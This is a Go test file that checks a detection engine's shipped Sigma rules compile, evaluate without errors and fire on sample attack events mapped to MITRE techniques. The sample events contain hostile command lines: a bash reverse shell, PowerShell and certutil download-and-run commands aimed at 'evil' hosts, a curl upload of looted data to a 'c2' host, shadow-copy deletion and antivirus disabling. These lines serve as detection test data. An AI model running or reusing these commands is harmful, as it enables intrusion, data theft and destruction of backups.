package rules

// DB-engine coverage regression suite.
//
// These tests load the ACTUAL shipped rules from the migration SQL (via
// extractMigrationRules) into a real RuleEngine and assert:
//
//   1. TestMigrationExtractor_SelfCheck — the extractor still parses a plausible
//      rule set (guards the harness itself against a silent parse regression).
//   2. TestAllMigrationSigmaRulesCompile — every shipped sigma rule compiles, so
//      no rule is silently "dark" (enabled in the DB yet never evaluated). This
//      is the DB-engine equivalent of the builtin TestAllBuiltinRulesCompile and
//      is what would have caught the T1059.004 dark rule fixed in migration 316.
//   3. TestMigrationRuleCoverage — a corpus of representative attack events fires
//      a shipped rule carrying the expected MITRE technique, locking the
//      detection-server RuleEngine's coverage the same way attack_coverage_test.go
//      locks the api-server builtin SigmaEvaluator.
//
// Unlike the pre-existing inline-copy tests (e.g. linux_collection_rule_test.go),
// these assert against the migration bytes directly, so a future edit to the SQL
// that breaks a rule fails here rather than passing against a stale copy.

import (
	"context"
	"testing"
)

// loadMigrationEngine builds a RuleEngine populated with every enabled rule
// shipped in the migrations. The platform gate is left ON (production default).
func loadMigrationEngine(t *testing.T) *RuleEngine {
	t.Helper()
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract migration rules: %v", err)
	}
	enabled := rules[:0]
	for _, r := range rules {
		if r.Enabled {
			enabled = append(enabled, r)
		}
	}
	e := NewRuleEngine()
	e.LoadRules(enabled)
	return e
}

// fires reports whether any match carries the given MITRE technique tag.
func firesTag(matches []*RuleMatch, technique string) bool {
	for _, m := range matches {
		for _, tag := range m.MITRETags {
			if tag == technique {
				return true
			}
		}
	}
	return false
}

func TestMigrationExtractor_SelfCheck(t *testing.T) {
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	// The migrations shipped ~129 rules at the time of writing (97 VALUES-form +
	// ~32 idempotent SELECT-form). A large drop means the tokenizer silently
	// stopped parsing a migration shape (e.g. the SELECT branch broke, which alone
	// hides the whole kill-chain class) — fail loudly so we never under-report
	// coverage without noticing.
	if len(rules) < 115 {
		t.Fatalf("extractor found only %d rules; expected >= 115 — the SQL parser likely broke on a migration shape (VALUES or SELECT form)", len(rules))
	}

	byType := map[string]int{}
	for _, r := range rules {
		if r.Name == "" {
			t.Errorf("rule with empty name: %+v", r)
		}
		if r.Type == "" {
			t.Errorf("rule %q has empty type", r.Name)
		}
		if r.Content == "" {
			t.Errorf("rule %q has empty content", r.Name)
		}
		byType[r.Type]++
	}
	// Sanity: we expect a healthy mix of sigma + behavioral rules.
	if byType["sigma"] < 50 {
		t.Errorf("expected >= 50 sigma rules, got %d (parser may be dropping content)", byType["sigma"])
	}
	if byType["behavioral"] < 5 {
		t.Errorf("expected >= 5 behavioral rules, got %d", byType["behavioral"])
	}
	t.Logf("extracted %d migration rules: %v", len(rules), byType)
}

func TestAllMigrationSigmaRulesCompile(t *testing.T) {
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	e := NewRuleEngine()
	var dark []string
	for _, r := range rules {
		if r.Type != "sigma" {
			continue
		}
		if _, err := compileSigmaRule(r, e.config); err != nil {
			dark = append(dark, r.Name+": "+err.Error())
		}
	}
	if len(dark) > 0 {
		t.Fatalf("%d shipped sigma rule(s) fail to compile and are silently never evaluated in production:\n  %v",
			len(dark), dark)
	}
}

// TestNoMigrationSigmaRuleErrorsAtMatch is a stronger gate than the compile
// check: a rule can PARSE and COMPILE yet return an error on every evaluation —
// e.g. a non-standard field modifier like `not_in`, which sigma-go rejects at
// match time with "unknown modifier". RuleEngine.Evaluate swallows that error
// (`if err != nil || !matched { continue }`), so such a rule is silently never
// fired with no log. This evaluates every shipped sigma rule against a benign
// event and fails if any returns an error, catching that "match-time dark" class
// generically (it caught T1571 and T1048.003, fixed in migration 317).
func TestNoMigrationSigmaRuleErrorsAtMatch(t *testing.T) {
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	e := NewRuleEngine()
	// A minimal benign event with a field of every category the rules key on, so
	// each rule's search actually runs its comparators rather than short-circuiting.
	benign := map[string]interface{}{
		"type": "process", "agent_id": "h", "platform": "windows",
		"imagePath": `C:\Windows\System32\notepad.exe`, "commandLine": "notepad",
		"dstPort": "12345", "dstIp": "10.0.0.9", "query": "example.com",
	}
	var broken []string
	for _, r := range rules {
		if r.Type != "sigma" {
			continue
		}
		cs, cerr := compileSigmaRule(r, e.config)
		if cerr != nil {
			continue // compile failures are covered by TestAllMigrationSigmaRulesCompile
		}
		if _, merr := cs.evaluator.Matches(context.Background(), benign); merr != nil {
			broken = append(broken, r.Name+": "+merr.Error())
		}
	}
	if len(broken) > 0 {
		t.Fatalf("%d shipped sigma rule(s) error on every evaluation (silently never fire):\n  %v",
			len(broken), broken)
	}
}

// coverageCase is one representative attack event and the technique the shipped
// rules must attribute to it. Events use the agents' JSON field names (imagePath,
// commandLine, …) plus a `platform` so the OS-scoping gate admits the rule.
type coverageCase struct {
	technique string
	platform  string
	event     map[string]interface{}
}

// relocatedToBuiltin maps a technique to the api-server builtin that took it over
// when migration 377 disabled the `rules` row that used to carry it. P4-6 made
// both engines evaluate that row, so one event became two alerts; 377 removes the
// duplicate by leaving the technique with the api engine only.
//
// Cases named here are not deleted and not skipped. They are INVERTED: the rule
// must now be ABSENT from this engine. Deleting the case would leave nothing to
// notice a re-enable, and skipping it would read as "covered" while asserting
// nothing — the exact failure mode this file exists to prevent. Coverage itself
// is asserted against the builtin in
// internal/detection/db_rule_builtin_port_test.go, which fires the same
// technique's events through the api evaluator.
var relocatedToBuiltin = map[string]string{
	"T1204.002": "Script Execution from World-Writable Directory (Linux)",
}

func TestMigrationRuleCoverage(t *testing.T) {
	e := loadMigrationEngine(t)

	proc := func(plat, image, cmd string) map[string]interface{} {
		return map[string]interface{}{
			"type": "process", "agent_id": "cov-host", "platform": plat,
			"imagePath": image, "commandLine": cmd,
		}
	}

	cases := []coverageCase{
		// ─── Windows ───────────────────────────────────────────────────────
		{"T1059.001", "windows", proc("windows", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			`powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA`)},
		{"T1490", "windows", proc("windows", `C:\Windows\System32\vssadmin.exe`,
			`vssadmin delete shadows /all /quiet`)},
		{"T1550.002", "windows", map[string]interface{}{
			"type": "auth", "agent_id": "cov-host", "platform": "windows",
			"EventID": "4624", "LogonType": "3", "LogonProcessName": "NtLmSsp",
			"WorkstationName": "-", "username": "attacker",
		}},
		{"T1047", "windows", proc("windows", `C:\Windows\System32\wbem\wmic.exe`,
			`wmic /node:10.0.0.5 process call create "cmd.exe /c whoami"`)},
		// T1021.002 (PsExec) is deliberately NOT here. Migration 375 disabled the
		// DB rule after #652 merged its coverage into the builtin
		// "PsExec Remote Execution", so this file — which evaluates the `rules`
		// table — has nothing left to attribute the technique with. That is the
		// intended end state, not a gap: the builtin carries attack.t1021.002 and
		// is exercised by internal/detection/attack_eval_test.go and
		// attack_coverage_test.go.
		//
		// Recorded rather than silently deleted. A technique disappearing from a
		// coverage list looks identical whether it moved engines or was dropped,
		// and only one of those is fine.
		{"T1021.001", "windows", proc("windows", `C:\Windows\System32\mstsc.exe`,
			`mstsc.exe /v:10.0.0.9`)},
		{"T1543.003", "windows", proc("windows", `C:\Windows\System32\sc.exe`,
			`sc.exe create evilsvc binPath= C:\temp\evil.exe`)},
		{"T1562.001", "windows", proc("windows", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			`powershell Set-MpPreference -DisableRealtimeMonitoring $true`)},
		{"T1105", "windows", proc("windows", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"`)},
		{"T1140", "windows", proc("windows", `C:\Windows\System32\certutil.exe`,
			`certutil -urlcache -f http://evil/x.exe x.exe`)},
		{"T1218.010", "windows", proc("windows", `C:\Windows\System32\regsvr32.exe`,
			`regsvr32 /s /i:http://evil/x.sct scrobj.dll`)},
		{"T1571", "windows", map[string]interface{}{
			"type": "network", "agent_id": "cov-host", "platform": "windows",
			"imagePath": `C:\Windows\System32\svchost.exe`, "Initiated": "true", "dstPort": "8443",
		}},
		{"T1090.003", "windows", map[string]interface{}{
			"type": "network", "agent_id": "cov-host", "platform": "windows", "dstPort": "9050",
		}},
		{"T1048.003", "windows", map[string]interface{}{
			"type": "network", "agent_id": "cov-host", "platform": "windows",
			"imagePath": `C:\Windows\System32\ftp.exe`, "dstPort": "2121",
		}},

		// ─── Linux ─────────────────────────────────────────────────────────
		{"T1059.004", "linux", proc("linux", `/bin/bash`,
			`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`)},
		{"T1053.003", "linux", proc("linux", `/usr/bin/crontab`, `crontab -e`)},
		{"T1548.003", "linux", proc("linux", `/usr/bin/sudo`, `sudo -l`)},
		{"T1222.002", "linux", proc("linux", `/usr/bin/chmod`, `chmod 777 /tmp/payload`)},
		// The file-event key is "operation" and its value is the FileEvent action
		// ENUM name — ingestion/handler.go:1135 sets `"operation":
		// f.GetAction().String()`, so the platform emits "FILE_ACTION_MODIFY",
		// never "write". These two cases used to read `"Operation": "write"` and
		// passed, because the extraction harness was binding migration 241's
		// content to these rules instead of migration 243's. 241 accepted "write"
		// and matched a capitalised key; 243 — the version production actually
		// runs — requires `operation|contains: modify|create`. So the assertion
		// was green against a rule that had not shipped for 130 migrations, on an
		// event shape that has never existed. Fixing the extractor surfaced both.
		{"T1136.001", "linux", map[string]interface{}{
			"type": "file", "agent_id": "cov-host", "platform": "linux",
			"path": "/etc/passwd", "operation": "FILE_ACTION_MODIFY",
		}},
		{"T1003.008", "linux", map[string]interface{}{
			"type": "file", "agent_id": "cov-host", "platform": "linux",
			"path": "/etc/shadow", "operation": "FILE_ACTION_MODIFY",
		}},

		// ─── Linux parity gap rules (migrations 293–309) ───────────────────
		{"T1046", "linux", proc("linux", `/usr/bin/nmap`, `nmap -sS -sV 10.0.0.0/24`)},
		{"T1201", "linux", proc("linux", `/usr/bin/chage`, `chage -l root`)},
		{"T1614.001", "linux", proc("linux", `/usr/bin/timedatectl`, `timedatectl status`)},
		{"T1070.006", "linux", proc("linux", `/usr/bin/touch`, `touch -r /bin/ls /tmp/payload`)},
		{"T1204.002", "linux", proc("linux", `/bin/bash`, `bash /tmp/setup.sh`)},
		{"T1546.004", "linux", proc("linux", `/bin/bash`, `echo 'curl evil|sh' >> /home/u/.bashrc`)},
		{"T1048", "linux", proc("linux", `/usr/bin/curl`, `curl -X POST --data-binary @/tmp/loot http://c2/up`)},
		{"T1518.001", "linux", proc("linux", `/usr/bin/which`, `which falcon-sensor osqueryd`)},
		{"T1562.003", "linux", proc("linux", `/bin/bash`, `export HISTFILE=/dev/null`)},
		{"T1564.001", "linux", proc("linux", `/tmp/.x/payload`, `/tmp/.hidden/payload --run`)},
		{"T1505.003", "linux", map[string]interface{}{
			"type": "process", "agent_id": "cov-host", "platform": "linux",
			"parentImagePath": "/usr/sbin/nginx", "imagePath": "/bin/bash", "commandLine": "bash -c id",
		}},
	}

	for _, c := range cases {
		t.Run(c.technique, func(t *testing.T) {
			m, err := e.Evaluate(context.Background(), c.event)
			if err != nil {
				t.Fatalf("Evaluate: %v", err)
			}
			if builtin, moved := relocatedToBuiltin[c.technique]; moved {
				if firesTag(m, c.technique) {
					t.Fatalf("%s still fires in the DB engine, but migration 377 disabled its rule "+
						"and handed the technique to the api builtin %q. Two engines matching the "+
						"same event is what 377 removes — one event became two alert rows. "+
						"Either the row was re-enabled, or 377 no longer disables it.",
						c.technique, builtin)
				}
				return
			}
			if !firesTag(m, c.technique) {
				var got []string
				for _, mm := range m {
					got = append(got, mm.RuleName)
				}
				t.Fatalf("no shipped rule attributed %s to the attack event; fired rules=%v", c.technique, got)
			}
		})
	}
}
